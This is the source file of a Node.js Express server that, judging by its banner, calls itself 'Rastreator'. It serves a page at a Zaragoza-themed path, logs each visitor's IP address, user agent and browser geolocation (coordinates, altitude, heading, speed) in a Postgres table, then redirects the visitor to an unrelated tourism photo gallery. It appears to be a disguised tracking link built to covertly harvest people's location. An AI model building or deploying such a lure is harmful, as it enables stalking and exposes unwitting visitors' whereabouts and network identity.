const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;
const REDIRECT_URL = 'https://verpueblos.com/aragon/zaragoza/zaragoza/galeria/18/';

// ── PostgreSQL connection ──────────────────────────────────────────────────
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false,
});

// ── Create table if it doesn't exist (idempotent) ─────────────────────────
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS visitors (
      id          SERIAL PRIMARY KEY,
      timestamp   TIMESTAMPTZ DEFAULT NOW(),
      ip          TEXT,
      user_agent  TEXT,
      geo_denied  BOOLEAN,
      deny_reason TEXT,
      latitude    DOUBLE PRECISION,
      longitude   DOUBLE PRECISION,
      accuracy    DOUBLE PRECISION,
      altitude    DOUBLE PRECISION,
      alt_accuracy DOUBLE PRECISION,
      heading     DOUBLE PRECISION,
      speed       DOUBLE PRECISION
    );
  `);
  console.log('✅ Tabla "visitors" lista.');
}

// ── Middleware ─────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── IP helper — extracts the most accurate real IP ─────────────────────────
function getRealIP(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) {
    // X-Forwarded-For can be a comma-separated list; first is the client IP
    const first = xff.split(',')[0].trim();
    if (first && first !== '::1') return first;
  }
  const cfIP = req.headers['cf-connecting-ip']; // Cloudflare
  if (cfIP) return cfIP;
  return req.socket?.remoteAddress || req.ip || 'unknown';
}

// ── Routes ─────────────────────────────────────────────────────────────────
app.get('/zaragoza-villanueva', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/log', async (req, res) => {
  const ip = getRealIP(req);
  const userAgent = req.headers['user-agent'] || 'unknown';
  const {
    denied, reason,
    latitude, longitude, accuracy,
    altitude, altitudeAccuracy, heading, speed,
  } = req.body;

  try {
    await pool.query(
      `INSERT INTO visitors
         (ip, user_agent, geo_denied, deny_reason,
          latitude, longitude, accuracy, altitude, alt_accuracy, heading, speed)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)`,
      [
        ip,
        userAgent,
        denied ?? true,
        reason ?? null,
        latitude ?? null,
        longitude ?? null,
        accuracy ?? null,
        altitude ?? null,
        altitudeAccuracy ?? null,
        heading ?? null,
        speed ?? null,
      ]
    );

    console.log(`[VISIT] IP: ${ip} | Geo: ${denied ? 'DENIED' : `${latitude}, ${longitude} (±${accuracy}m)`}`);
    res.json({ success: true, redirect: REDIRECT_URL });
  } catch (err) {
    console.error('DB error:', err.message);
    res.status(500).json({ success: false });
  }
});

app.get('/', (req, res) => res.redirect('/zaragoza-villanueva'));

// ── Start ──────────────────────────────────────────────────────────────────
initDB()
  .then(() => {
    app.listen(PORT, () => {
      console.log(`🚀 Rastreator en línea → http://localhost:${PORT}/zaragoza-villanueva`);
    });
  })
  .catch((err) => {
    console.error('Error inicializando DB:', err.message);
    process.exit(1);
  });
